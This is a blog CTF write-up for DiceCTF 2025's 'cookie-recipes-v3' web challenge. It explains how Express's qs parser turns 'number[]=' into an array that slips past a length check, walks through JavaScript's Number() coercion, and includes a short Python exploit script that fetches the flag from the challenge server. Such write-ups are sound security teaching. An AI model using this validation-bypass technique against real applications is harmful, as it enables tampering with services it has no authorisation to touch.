<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Dice25: Writeup for web/cookie-recipes-v3 | hxuu</title>
<meta name=keywords content="ctf,write-up,dice"><meta name=description content="CTF write-up for Cookie Recipes V3"><meta name=author content="hxuu"><link rel=canonical href=https://hxuu.github.io/blog/ctf/dice25/cookie-recipes-v3/><link crossorigin=anonymous href=/blog/assets/css/stylesheet.a9de69711750554b5ca1926546c46a763ce30e0caa50cf5d86499b3b035e42bf.css integrity="sha256-qd5pcRdQVUtcoZJlRsRqdjzjDgyqUM9dhkmbOwNeQr8=" rel="preload stylesheet" as=style><link rel=icon href=https://hxuu.github.io/blog/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hxuu.github.io/blog/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hxuu.github.io/blog/favicon-32x32.png><link rel=apple-touch-icon href=https://hxuu.github.io/blog/apple-touch-icon.png><link rel=mask-icon href=https://hxuu.github.io/blog/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://hxuu.github.io/blog/ctf/dice25/cookie-recipes-v3/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hxuu.github.io/blog/ctf/dice25/cookie-recipes-v3/"><meta property="og:site_name" content="hxuu"><meta property="og:title" content="Dice25: Writeup for web/cookie-recipes-v3"><meta property="og:description" content="CTF write-up for Cookie Recipes V3"><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="ctf"><meta property="article:published_time" content="2025-04-12T12:18:04+01:00"><meta property="article:modified_time" content="2025-04-12T12:18:04+01:00"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Write-Up"><meta property="article:tag" content="Dice"><meta property="og:image" content="https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Dice25: Writeup for web/cookie-recipes-v3"><meta name=twitter:description content="CTF write-up for Cookie Recipes V3"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Ctfs","item":"https://hxuu.github.io/blog/ctf/"},{"@type":"ListItem","position":2,"name":"Dice25: Writeup for web/cookie-recipes-v3","item":"https://hxuu.github.io/blog/ctf/dice25/cookie-recipes-v3/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Dice25: Writeup for web/cookie-recipes-v3","name":"Dice25: Writeup for web\/cookie-recipes-v3","description":"CTF write-up for Cookie Recipes V3","keywords":["ctf","write-up","dice"],"articleBody":"Challenge Overview CTF: Dice CTF 2025 Challenge: cookie-recipes-v3 Category: Web Exploitation Points: 105 (459 solves) Description: Mmmmmmm‚Ä¶ Source code: index.js TL;DR In the cookie-recipes-v3 challenge, ExpressJS‚Äôs use of the qs library for query string parsing allows bypassing a length check on the number parameter. By sending a query like number[]=1000000000, which qs parses into an array, we exploit JavaScript‚Äôs type coercion and array behavior to pass the check. The exploit manipulates the Number() function‚Äôs implicit conversion to retrieve the flag.\nInitial Analysis At first glance, the challenge presents itself as a simple cookie counter application. Three buttons to bake cookies in different amounts, a disabled button for a larger batch, and one final button to deliver cookies.\nThe UI is minimal, but the disabling of Super cookie recipe (makes a million) button screamed a hint for me. Let‚Äôs check the source code:\nconst express = require('express') const app = express() const cookies = new Map() app.use((req, res, next) =\u003e { const cookies = req.headers.cookie const user = cookies?.split('=')?.[1] if (user) { req.user = user } else { const id = Math.random().toString(36).slice(2) res.setHeader('set-cookie', `user=${id}`) req.user = id } next() }) app.get('/', (req, res) =\u003e { const count = cookies.get(req.user) ?? 0 res.type('html').send(` You have ${count} cookies Basic cookie recipe (makes one) Advanced cookie recipe (makes a dozen) Super cookie recipe (makes a million) Deliver cookies `) }) app.get('/script.js', (_req, res) =\u003e { res.type('js').send(` const basic = document.querySelector('#basic') const advanced = document.querySelector('#advanced') const deliver = document.querySelector('#deliver') const showCookies = (number) =\u003e { const span = document.querySelector('span') span.textContent = number } basic.addEventListener('click', async () =\u003e { const res = await fetch('/bake?number=1', { method: 'POST' }) const number = await res.text() showCookies(+number) }) advanced.addEventListener('click', async () =\u003e { const res = await fetch('/bake?number=12', { method: 'POST' }) const number = await res.text() showCookies(+number) }) deliver.addEventListener('click', async () =\u003e { const res = await fetch('/deliver', { method: 'POST' }) const text = await res.text() alert(text) }) `) }) app.post('/bake', (req, res) =\u003e { const number = req.query.number if (!number) { res.end('missing number') } else if (number.length \u003c= 2) { cookies.set(req.user, (cookies.get(req.user) ?? 0) + Number(number)) res.end(cookies.get(req.user).toString()) } else { res.end('that is too many cookies') } }) app.post('/deliver', (req, res) =\u003e { const current = cookies.get(req.user) ?? 0 const target = 1_000_000_000 if (current \u003c target) { res.end(`not enough (need ${target - current}) more`) } else { res.end(process.env.FLAG) } }) app.listen(3000) The backend is a small Express.js app with no authentication or database ‚Äî just an in-memory Map to store cookie counts per user. Each visitor gets a user cookie set via middleware if it doesn‚Äôt already exist, and this ID is used as the key to track how many cookies they‚Äôve baked.\nThere are two main endpoints that matter here:\nPOST /bake: accepts a number parameter in the query string, increments the user‚Äôs cookie count accordingly ‚Äî but only if number.length \u003c= 2. POST /deliver: checks if the user has reached one billion cookies. If so, it returns the flag; otherwise, it just tells you how many more you need. How do I know they matter? Well, because one serves the flag, and the other allows user input to be passed.\nLooking closer, The server doesn‚Äôt validate the type of number, only its length. That might seem restrictive, so let‚Äôs check express docs for more info.\nSomething in red, yay! Let‚Äôs take a closer look at how req.query.number is actually interpreted.\nTask Analysis Admittedly, I took the hardest route when solving the challenge on remote, and when I tried to solve it locally, it didn‚Äôt work xD.\nOnly after some time did I realize what was wrong: ExpressJS version 5.x mitigates the vulnerability (or feature?) I‚Äôm about to discuss. I found another (simpler and more effective) solution here\nTip: The solution above works because NaN compared to any numeric value returns false. Let‚Äôs now proceed with my solution, elegant and highlights my overthinking nature LOL.\nWe focus on this code block:\nif (number.length \u003c= 2) { cookies.set(req.user, (cookies.get(req.user) ?? 0) + Number(number)) res.end(cookies.get(req.user).toString()) } The check only limits the .length of number. Suspecting Express uses the qs module for query parsing (req.query), we can test that by creating our own ExpressJS environnment, parse a query string using both express and qs and compare the results.\nSet up the environnment: npm init -y npm install express@4.15.0 Set a simple web server to test the hypotheses: const express = require('express'); const qs = require('qs'); const app = express(); app.get('/', (req, res) =\u003e { const queryExpress = req.query; // the parsed req.query from expressjs const queryQS = qs.parse('a[]=b'); // the parsed req.query from qs console.log(queryQS) console.log(queryExpress); res.end(); }); app.listen(3000, () =\u003e { console.log(`Server listening at http://localhost:3000`); }); Test our hypotheses: curl \"http://localhost:3000/?a[]=b\" Gives:\nweb/cookie-recipes-v3/playground via Óúò v20.19.0 ‚ûú node index.js Server listening at http://localhost:3000 { a: [ 'b' ] } { a: [ 'b' ] } Great! express uses the qs module to parse query strings, not Node‚Äôs default querystring. Let‚Äôs check qs documentation to see what we can do with this.\nIt turns out that qs supports parsing of nested objects, arrays, and more. For example:\na[]=b gets parsed into:\n{ a: [\"b\"] } So how does this help in our challenge?\nIf we revisit the original code:\nif (number.length \u003c= 2) { cookies.set(req.user, (cookies.get(req.user) ?? 0) + Number(number)) res.end(cookies.get(req.user).toString()) } We can see that the check is on number.length \u003c= 2. If number is a string like \"100\", the check fails (length = 3). But if we send number[]= in the query string, Express (via qs) parses that into an array. Arrays in JavaScript have a .length property, and we can ensure that property is \u003c= 2 by only providing one or two elements ‚Äî like number[]=1000000000.\nSo, even though the check is still in place, we bypass it by controlling the input type ‚Äî an array instead of a string. Now we just need to understand how JavaScript handles Number(array).\nYou could experiment with different inputs to find the answer quickly, but let‚Äôs take a deeper dive into JavaScript‚Äôs internal workings, specifically focusing on its implicit type conversion feature.\nYou can skip this section and move straight to the exploitation if you‚Äôre already familiar with the details of type conversion.\nWhen the Number() function is called, it converts its argument into a number following these steps:\nIf the argument is already a Number, it simply returns that number. If the argument is a String, it converts the string to a number (via StringToNumber()). If the argument is an object (which is the case for arrays in JavaScript), it calls the ToPrimitive() function. ToPrimitive() is invoked implicitly when we pass an object, and what does it do?\nAs the name suggests, this function converts an object to a primitive value (either a string or a number), and it does so by calling OrdinaryToPrimitive. This function takes the object and a preferred type (by default, number).\nOrdinaryToPrimitive proceeds as follows:\nIt first calls the object‚Äôs valueOf() method, which, in the case of arrays, returns the array itself. If that doesn‚Äôt provide a suitable primitive, it then calls the object‚Äôs toString() method, which returns the string representation of the array. .valueOf() returns the array itself because that‚Äôs how JavaScript‚Äôs Array.prototype.valueOf() is defined in the spec.\nYou can read more about Object.prototype.valueOf() and Object.prototype.toString() to understand how they work.\nSo, what‚Äôs happening here? When an array is passed to Number(), it is first converted to a string (via toString()), and then that string is passed to Number(), which converts it to a number using StringToNumber().\nThis process of implicit coercion explains how we can pass an array to Number() and still get the correct numeric result.\nExploitation Armed with this newfound knowledge, we know exactly what to do: we need to craft a payload that, when converted to a string, results in a number that won‚Äôt cause issues for the Number() function.\nThe payload will look like this:\nn u m b e r [ ] = 1 0 0 0 0 0 0 0 0 0 T h i s i s t h e e x a c t t a r g e t v a l u e w e n e e d Now, to submit this query string, we can create a simple Python script that will interact with the server and retrieve the flag:\nimport requests url = \"https://cookie.dicec.tf\" s = requests.Session() # Start a session to maintain cookies across requests s.get(url) # Send the payload to the /bake endpoint s.post(url + \"/bake\", params={\"number[]\": \"100000000000000\"}) # Send a request to the /deliver endpoint to fetch the flag res = s.post(url + \"/deliver\") print(res.text) # Print the flag This script sends the payload to the server, which, after processing, returns the flag in the response.\n/tmp via üêç v3.13.2 took 2s ‚ûú python exploit.py dice{cookie_cookie_cookie} Flag is: dice{cookie_cookie_cookie}\nConclusions What we learned in this challenge:\nType Coercion in JavaScript: Understanding how JavaScript implicitly converts objects to primitives (e.g., arrays to strings) is crucial in exploiting type-based vulnerabilities.\nQuery String Parsing: Knowing how libraries like qs differ from default query parsing allows manipulation of input data to bypass security checks.\nArray Behavior: Recognizing how arrays handle .length and conversion to string helps in crafting inputs that pass validation checks.\nImplicit Conversion: Realizing the role of implicit functions like ToPrimitive() and OrdinaryToPrimitive() in type conversion clarifies the behavior of complex data types in JavaScript.\nReferences If you‚Äôre interested to learn more, here is a list of useful references:\nExpress.js API - req.body: Understanding how Express parses and handles request bodies is essential for analyzing how input is processed in the challenge.\nqs - Query String Parsing Library: This explains how the qs library parses query strings, which is key to understanding the behavior of the vulnerable application in the challenge.\nQuery String (Wikipedia): Provides general background on how query strings work, which helps in understanding the significance of query parameters in the exploit.\nJavaScript Equality Comparisons and Sameness (MDN): Details the behavior of equality operators, helping to understand how JavaScript compares values and objects in the challenge.\nTC39 - ToPrimitive: The official specification describing how JavaScript converts objects to primitive values, which is central to the implicit type conversion used in the exploit.\nTC39 - ToNumber: The specification for converting values to numbers, explaining how JavaScript handles conversion when objects (like arrays) are passed to the Number() function.\nqs - Parsing Arrays: Offers insights into how the qs library parses arrays in query strings, which is essential for understanding how the exploit works when using arrays.\nJavaScript Addition Operator (TC39): Describes how the addition operator works, particularly when involving coercion, which is part of the exploit when handling arrays and numbers.\nNumber Constructor (MDN): Explains how the Number() function behaves, specifically when dealing with arrays and how they are converted into numbers.\n","wordCount":"1822","inLanguage":"en","image":"https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2025-04-12T12:18:04+01:00","dateModified":"2025-04-12T12:18:04+01:00","author":{"@type":"Person","name":"hxuu"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hxuu.github.io/blog/ctf/dice25/cookie-recipes-v3/"},"publisher":{"@type":"Organization","name":"hxuu","logo":{"@type":"ImageObject","url":"https://hxuu.github.io/blog/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hxuu.github.io/blog/ accesskey=h title="hxuu (Alt + H)"><img src=https://hxuu.github.io/apple-touch-icon.png alt aria-label=logo height=35>hxuu</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hxuu.github.io/blog/ctf/ title=CTFs><span>CTFs</span></a></li><li><a href=https://hxuu.github.io/blog/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://hxuu.github.io/blog/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://github.com/hxuu title="About Me"><span>About Me</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://hxuu.github.io/blog/>Home</a>&nbsp;¬ª&nbsp;<a href=https://hxuu.github.io/blog/ctf/>Ctfs</a></div><h1 class="post-title entry-hint-parent">Dice25: Writeup for web/cookie-recipes-v3</h1><div class=post-description>CTF write-up for Cookie Recipes V3</div><div class=post-meta><span title='2025-04-12 12:18:04 +0100 +0100'>April 12, 2025</span>&nbsp;¬∑&nbsp;9 min&nbsp;¬∑&nbsp;hxuu&nbsp;|&nbsp;<a href=https://github.com/hxuu/content/ctf/dice25/cookie-recipes-v3.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#challenge-overview>Challenge Overview</a></li><li><a href=#tldr>TL;DR</a></li><li><a href=#initial-analysis>Initial Analysis</a></li><li><a href=#task-analysis>Task Analysis</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#conclusions>Conclusions</a></li><li><a href=#references>References</a></li></ul></nav></div></details></div><div class=post-content><h2 id=challenge-overview>Challenge Overview<a hidden class=anchor aria-hidden=true href=#challenge-overview>#</a></h2><ul><li><strong>CTF</strong>: Dice CTF 2025</li><li><strong>Challenge</strong>: cookie-recipes-v3</li><li><strong>Category</strong>: Web Exploitation</li><li><strong>Points</strong>: 105 (459 solves)</li><li><strong>Description</strong>: Mmmmmmm&mldr;</li><li><strong>Source code</strong>: <a href=https://static.dicega.ng/uploads/58daa3f015c7a217f9c0e9973ce30d8d3a579e127ed6900ff88893a88a7c5316/index.js>index.js</a></li></ul><h2 id=tldr>TL;DR<a hidden class=anchor aria-hidden=true href=#tldr>#</a></h2><p>In the <strong>cookie-recipes-v3</strong> challenge, ExpressJS&rsquo;s use of the <code>qs</code> library for query string parsing allows bypassing a length check on the <code>number</code> parameter. By sending a query like <code>number[]=1000000000</code>, which <code>qs</code> parses into an array, we exploit JavaScript&rsquo;s type coercion and array behavior to pass the check. The exploit manipulates the <code>Number()</code> function‚Äôs implicit conversion to retrieve the flag.</p><h2 id=initial-analysis>Initial Analysis<a hidden class=anchor aria-hidden=true href=#initial-analysis>#</a></h2><p>At first glance, the challenge presents itself as a simple cookie counter application. Three buttons to bake cookies in different amounts, a disabled button for a larger batch, and one final button to deliver cookies.</p><p><img alt=website loading=lazy src=/blog/images/2025-04-12-12-22-02.png></p><p>The UI is minimal, but the disabling of <code>Super cookie recipe (makes a million)</code> button screamed a hint for me. Let&rsquo;s check the source code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>express</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;express&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>app</span> <span class=o>=</span> <span class=nx>express</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>cookies</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Map</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>((</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>cookies</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>headers</span><span class=p>.</span><span class=nx>cookie</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>user</span> <span class=o>=</span> <span class=nx>cookies</span><span class=o>?</span><span class=p>.</span><span class=nx>split</span><span class=p>(</span><span class=s1>&#39;=&#39;</span><span class=p>)</span><span class=o>?</span><span class=p>.[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>user</span><span class=p>)</span> <span class=p>{</span> <span class=nx>req</span><span class=p>.</span><span class=nx>user</span> <span class=o>=</span> <span class=nx>user</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>id</span> <span class=o>=</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>random</span><span class=p>().</span><span class=nx>toString</span><span class=p>(</span><span class=mi>36</span><span class=p>).</span><span class=nx>slice</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>setHeader</span><span class=p>(</span><span class=s1>&#39;set-cookie&#39;</span><span class=p>,</span> <span class=sb>`user=</span><span class=si>${</span><span class=nx>id</span><span class=si>}</span><span class=sb>`</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nx>req</span><span class=p>.</span><span class=nx>user</span> <span class=o>=</span> <span class=nx>id</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>next</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>count</span> <span class=o>=</span> <span class=nx>cookies</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>user</span><span class=p>)</span> <span class=o>??</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>type</span><span class=p>(</span><span class=s1>&#39;html&#39;</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=sb>`
</span></span></span><span class=line><span class=cl><span class=sb>        &lt;link rel=&#34;stylesheet&#34; href=&#34;https://cdn.jsdelivr.net/npm/@exampledev/new.css@1/new.min.css&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=sb>        &lt;link rel=&#34;stylesheet&#34; href=&#34;https://fonts.xz.style/serve/inter.css&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=sb>        &lt;div&gt;You have &lt;span&gt;</span><span class=si>${</span><span class=nx>count</span><span class=si>}</span><span class=sb>&lt;/span&gt; cookies&lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=sb>        &lt;button id=&#34;basic&#34;&gt;Basic cookie recipe (makes one)&lt;/button&gt;
</span></span></span><span class=line><span class=cl><span class=sb>        &lt;br&gt;
</span></span></span><span class=line><span class=cl><span class=sb>        &lt;button id=&#34;advanced&#34;&gt;Advanced cookie recipe (makes a dozen)&lt;/button&gt;
</span></span></span><span class=line><span class=cl><span class=sb>        &lt;br&gt;
</span></span></span><span class=line><span class=cl><span class=sb>        &lt;button disabled&gt;Super cookie recipe (makes a million)&lt;/button&gt;
</span></span></span><span class=line><span class=cl><span class=sb>        &lt;br&gt;
</span></span></span><span class=line><span class=cl><span class=sb>        &lt;button id=&#34;deliver&#34;&gt;Deliver cookies&lt;/button&gt;
</span></span></span><span class=line><span class=cl><span class=sb>        &lt;script src=&#34;/script.js&#34;&gt;&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=sb>    `</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/script.js&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>_req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>type</span><span class=p>(</span><span class=s1>&#39;js&#39;</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=sb>`
</span></span></span><span class=line><span class=cl><span class=sb>        const basic = document.querySelector(&#39;#basic&#39;)
</span></span></span><span class=line><span class=cl><span class=sb>        const advanced = document.querySelector(&#39;#advanced&#39;)
</span></span></span><span class=line><span class=cl><span class=sb>        const deliver = document.querySelector(&#39;#deliver&#39;)
</span></span></span><span class=line><span class=cl><span class=sb>
</span></span></span><span class=line><span class=cl><span class=sb>        const showCookies = (number) =&gt; {
</span></span></span><span class=line><span class=cl><span class=sb>            const span = document.querySelector(&#39;span&#39;)
</span></span></span><span class=line><span class=cl><span class=sb>            span.textContent = number
</span></span></span><span class=line><span class=cl><span class=sb>        }
</span></span></span><span class=line><span class=cl><span class=sb>
</span></span></span><span class=line><span class=cl><span class=sb>        basic.addEventListener(&#39;click&#39;, async () =&gt; {
</span></span></span><span class=line><span class=cl><span class=sb>            const res = await fetch(&#39;/bake?number=1&#39;, { method: &#39;POST&#39; })
</span></span></span><span class=line><span class=cl><span class=sb>            const number = await res.text()
</span></span></span><span class=line><span class=cl><span class=sb>            showCookies(+number)
</span></span></span><span class=line><span class=cl><span class=sb>        })
</span></span></span><span class=line><span class=cl><span class=sb>
</span></span></span><span class=line><span class=cl><span class=sb>        advanced.addEventListener(&#39;click&#39;, async () =&gt; {
</span></span></span><span class=line><span class=cl><span class=sb>            const res = await fetch(&#39;/bake?number=12&#39;, { method: &#39;POST&#39; })
</span></span></span><span class=line><span class=cl><span class=sb>            const number = await res.text()
</span></span></span><span class=line><span class=cl><span class=sb>            showCookies(+number)
</span></span></span><span class=line><span class=cl><span class=sb>        })
</span></span></span><span class=line><span class=cl><span class=sb>
</span></span></span><span class=line><span class=cl><span class=sb>
</span></span></span><span class=line><span class=cl><span class=sb>        deliver.addEventListener(&#39;click&#39;, async () =&gt; {
</span></span></span><span class=line><span class=cl><span class=sb>            const res = await fetch(&#39;/deliver&#39;, { method: &#39;POST&#39; })
</span></span></span><span class=line><span class=cl><span class=sb>            const text = await res.text()
</span></span></span><span class=line><span class=cl><span class=sb>            alert(text)
</span></span></span><span class=line><span class=cl><span class=sb>        })
</span></span></span><span class=line><span class=cl><span class=sb>    `</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s1>&#39;/bake&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>number</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>query</span><span class=p>.</span><span class=nx>number</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>number</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>end</span><span class=p>(</span><span class=s1>&#39;missing number&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>number</span><span class=p>.</span><span class=nx>length</span> <span class=o>&lt;=</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>cookies</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>user</span><span class=p>,</span> <span class=p>(</span><span class=nx>cookies</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>user</span><span class=p>)</span> <span class=o>??</span> <span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=nb>Number</span><span class=p>(</span><span class=nx>number</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>end</span><span class=p>(</span><span class=nx>cookies</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>user</span><span class=p>).</span><span class=nx>toString</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>end</span><span class=p>(</span><span class=s1>&#39;that is too many cookies&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s1>&#39;/deliver&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>current</span> <span class=o>=</span> <span class=nx>cookies</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>user</span><span class=p>)</span> <span class=o>??</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>target</span> <span class=o>=</span> <span class=mi>1_000_000_000</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>current</span> <span class=o>&lt;</span> <span class=nx>target</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>end</span><span class=p>(</span><span class=sb>`not enough (need </span><span class=si>${</span><span class=nx>target</span> <span class=o>-</span> <span class=nx>current</span><span class=si>}</span><span class=sb>) more`</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>end</span><span class=p>(</span><span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>FLAG</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>listen</span><span class=p>(</span><span class=mi>3000</span><span class=p>)</span>
